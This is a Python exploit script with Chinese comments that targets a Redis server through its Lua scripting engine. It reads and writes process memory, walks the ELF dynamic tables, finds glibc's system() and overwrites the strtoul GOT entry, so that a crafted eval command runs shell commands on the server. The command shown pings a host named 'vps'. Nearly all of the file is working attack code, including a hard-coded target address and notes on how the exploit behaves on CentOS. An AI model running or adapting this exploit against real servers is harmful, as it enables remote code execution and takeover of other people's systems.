#!/usr/bin/env python
# -*- coding:utf-8 -*-
import redis, struct, sys
import lua_scripts as scripts

class luaexp:
    def __init__(self, host, port):
        self.__conn = redis.Redis(host = host, port = port, db = 0)
        self.__ReadMemory = self.__conn.register_script(scripts.readmem)
        self.__WriteMemory = self.__conn.register_script(scripts.writemem)
        self.__FillGot = self.__conn.register_script(scripts.fillgot)
        self.__GotTable = []
    def FillGot(self):
        print self.__FillGot()
    def ReadMemory(self, address):
        low, high = self.__ReadMemory(args = [address])
        binary = struct.pack('I', low) + struct.pack('I', high)
        return binary
    def WriteMemoryEx(self, addr_low, addr_high, val_low, val_high):
        self.__WriteMemory(args=[addr_low, addr_high, val_low, val_high])
        return 0
    def WriteMemory(self, addr, val):
        (lo, hi) = struct.unpack('II', struct.pack('Q', addr))
        (vlo, vhi) = struct.unpack('II', struct.pack('Q', val))
        return  self.WriteMemoryEx(lo, hi, vlo, vhi)
    def ReadMemoryFmt(self, address, fmt):
        return struct.unpack(fmt, self.ReadMemory(address))
    def ReadMemoryStr(self, address):
        binary = self.ReadMemory(address)
        try:
            idx = binary.index(chr(0))
            return binary[0: idx]
        except ValueError, e:
            return binary
    def Find_DYNAMIC(self, base):
        #解析 Elf64_Ehdr
        (e_flags, e_ehsize, e_phentsize) = self.ReadMemoryFmt(base + 0x30, 'IHH')
        (e_phnum, e_shentsize, e_shnum, e_shstrndx) = self.ReadMemoryFmt(base + 0x38, 'HHHH')
        #解析 Elf64_Phdr[]
        for i in range(0, e_phnum):
            addr = base + e_ehsize + e_phentsize * i
            (p_type, p_flags) = self.ReadMemoryFmt(addr, 'II')
            if p_type == 2: #PT_DYNAMIC
                (p_vaddr,) = self.ReadMemoryFmt(addr + 0x10, 'Q')
                (p_memsz,) = self.ReadMemoryFmt(addr + 0x28, 'Q')
                return p_vaddr, p_memsz #返回地址和大小
        return 0
    def Find_tables(self, DYNAMIC, DYNAMIC_SZ):
        # extern Elf64_Dyn _DYNAMIC[];
        #查找重定向表和字符表
        reltab = 0
        strtab = 0
        symtab = 0
        for i in range(0, DYNAMIC_SZ/0x10):
            print 'checking DYNAMIC item ', i
            addr = DYNAMIC + 0x10 * i #sizeof(Elf64_Dyn) = 0x10
            (d_tag,) = self.ReadMemoryFmt(addr, 'Q')
            if d_tag == 0: #DT_NULL
                break
            if d_tag == 5: #DT_STRTAB
                (d_ptr,) = self.ReadMemoryFmt(addr + 8, 'Q')
                strtab = d_ptr
            if d_tag == 6: #DT_SYMTAB
                (d_ptr,) = self.ReadMemoryFmt(addr + 8, 'Q')
                symtab = d_ptr
            if d_tag == 7: #DT_RELA
                (d_ptr,) = self.ReadMemoryFmt(addr + 8, 'Q')
                reltab = d_ptr
        return (reltab, strtab, symtab) #返回重定向表，字符表，符号表
    def Find_func(self, reltab, strtab, symtab, name):
        #解析Elf64_Sym[]
        for i in range(150, 250): #调整
            addr = reltab + 0x18 * i #sizeof(Elf64_Rela) = 0x18
            # define ELF64_R_SYM(i)((i) >> 32)
            # define ELF64_R_TYPE(i)((i) & 0xf f f f f f f f L)
            # define ELF64_R_INFO(s, t)(((s) << 32) + ((t) & 0xf f f f f f f f L))
            (r_info,) = self.ReadMemoryFmt(addr + 8, 'Q')
            r_sym = r_info >> 32
            r_type = r_info & 0xffffffff
            if r_type != 7:
                continue

            (st_name, st_info, st_other, st_shndx) = self.ReadMemoryFmt(symtab + 0x18 * r_sym, 'IBBH') #sizeof(Elf64_Sym) = 0x18
            st_type = st_info & 0xf #低4位是符号类型信息
            if st_type != 2:
                continue

            func = self.ReadMemoryStr(strtab + st_name)
            print 'Func in symtab: ', func, 'type: ', st_type
            if func == name:
                (r_offset,) = self.ReadMemoryFmt(addr, 'Q')
                return r_offset
        return 0
    def Find_so_func(self, strtab, symtab, name):
        for i in range(1200, 2000): #调整搜索条目1000 到 2000之间
            addr = symtab + 0x18 * i
            (st_name, st_info, st_other, st_shndx) = self.ReadMemoryFmt(addr, 'IBBH')
            st_type = st_info & 0xf
            if st_type != 2:
                continue
            func = self.ReadMemoryStr(strtab + st_name)
            print 'Func in symtab@so: ', func, 'type: ', st_type
            if func == name:
                (st_value,) = self.ReadMemoryFmt(addr + 8, 'Q')
                return st_value
        return 0
    def printable(self, s):
        r = ''
        for c in s:
            r += '\\x%.2x' % (ord(c))
        print '%s, size=%d' % (r, len(s))
    def Find_libc(self, got_func): #查找libc基地址
        (addr,) = self.ReadMemoryFmt(got_func, 'Q')
        print 'function address is 0x%x' % (addr)
        addr = addr & 0xfffffffffffff000
        for i in range(0, 200):
            addr -= 0x1000
            head = self.ReadMemoryStr(addr)
            #self.printable(head)
            if head[1:4] == 'ELF':
                return addr
        return 0 #该操作一旦失败会引起访问违例，所以这里返回值没有意义
    def Save_got(self, addr, first):
        self.__GotTable.append(first)
        for i in range(1, 200):
            (ptr,) = self.ReadMemoryFmt(addr + 8 * i, 'Q')
            if ptr == 0:
                break
            self.__GotTable.append(ptr)
        return len(self.__GotTable)
    def Load_got(self, addr):
        sc = scripts.writetuple
        for i in range(0, len(self.__GotTable)):
            val = self.__GotTable[i]
            addrs = addr + 8 * i
            print 'Read item: 0x%x -> 0x%x' % (addrs, val)
            (lo, hi) = struct.unpack('II', struct.pack('Q', addrs))
            (vlo, vhi) = struct.unpack('II', struct.pack('Q', val))
            sc += "writemem(%d, %d, %d, %d)\n" % (lo, hi, vlo, vhi)
        sc += 'redis["memview"] = {1}\n' #Import !!!
        sc += 'collectgarbage("stop", 0)\n'
        print 'Write got memory'
        tmp = self.__conn.register_script(sc)
        tmp()
        return 0
def main():
    lua = luaexp(host = '192.168.91.137', port = 6379)

    DYNAMIC, DYNAMIC_SZ = lua.Find_DYNAMIC(0x400000)
    if DYNAMIC == 0:
        print 'Cant find address of _DYNAMIC!'
        return
    print 'Found address of _DYNAMIC: 0x%x size: 0x%x' % (DYNAMIC, DYNAMIC_SZ)
    (reltab, strtab, symtab) = lua.Find_tables(DYNAMIC, DYNAMIC_SZ)
    if reltab == 0 or strtab == 0 or symtab == 0:
        print 'Cant find address of STRTAB,SYMTAB or RELTAB'
        return
    print 'Found address RELTAB: 0x%x, STRTAB: 0x%x, SYMTAB: 0x%x' % (reltab, strtab, symtab)
    got_strtoul = lua.Find_func(reltab, strtab, symtab, 'strtoul')
    if got_strtoul == 0:
        print 'Cant find address of function strtoul'
        return
    print 'Found address of strtoul@got: 0x%x' % (got_strtoul)
    print 'try to fill strtoul@got'

    lua.FillGot()
    glibc = lua.Find_libc(got_strtoul)

    if glibc == 0:
        print 'cant find glibc base address'
        return
    print 'base address of gblic: 0x%x' % (glibc)
    DYNAMIC, DYNAMIC_SZ = lua.Find_DYNAMIC(glibc)
    print 'Offset of _DYNAMIC: 0x%x' % (DYNAMIC)
    if DYNAMIC & 0xffff00000000 == 0:
        DYNAMIC += glibc
    #非常重要！上面一行代码，我的主机上是偏移量，然而一个目标主机偏移值很大，后来发现直接是
    #一个内存地址，这个非常重要！！
    if DYNAMIC == 0:
        print 'Cant find address of _DYNAMIC@glibc!'
        return
    print 'Found address of _DYNAMIC@glibc: 0x%x, size: 0x%x' % (DYNAMIC, DYNAMIC_SZ)
    (reltab, strtab, symtab) = lua.Find_tables(DYNAMIC, DYNAMIC_SZ)
    if reltab == 0 or strtab == 0 or symtab == 0: #这里只需要符号表和字符表
        print 'Cant find address of STRTAB,SYMTAB or RELTAB'
        return
    print 'Found address@glibc RELTAB: 0x%x, STRTAB: 0x%x, SYMTAB: 0x%x' % (reltab, strtab, symtab)
    system = lua.Find_so_func(strtab, symtab, 'system')
    if system == 0:
        print 'Cant found address of system'
        return
    if system & 0xffff00000000 == 0:
        system += glibc
    #非常重要！上面一行代码，我的主机上是偏移量，然而一个目标主机偏移值很大，后来发现直接是
    #一个内存地址，这个非常重要！！
    print 'Found system@glibc: 0x%x' % (system)
    print 'store pointers at got'

    #got_strtoul = 0x6bd768
    #system = 0x7ffff73e1760
    if lua.Save_got(got_strtoul, system) < 2:
        print 'save util unsed got item faild'
        return

    print 'load stored got && write system to strtoul@got'
    lua.Load_got(got_strtoul)

    #存在的问题
    #在测试CentOS 7.5.1804时发生了崩溃，原因时填充完strtoul的got项目后由于后一个指针被马上调用了（来不及恢复）
    #而导致了如下可预料的错误
    #Program received signal SIGSEGV, Segmentation fault.
    #0x00007fff00000003 in ?? ()
    #看来Exploit并不完美，寻求可以控制tt的写内存方法，才能完全在任何环境稳定下来
    print r'''
    Done, mybe you can connect to redis server
    execute comamnd eval "tonumber('ping -c 1 vps', 8)" 0
    '''
if __name__ == '__main__':
    main()

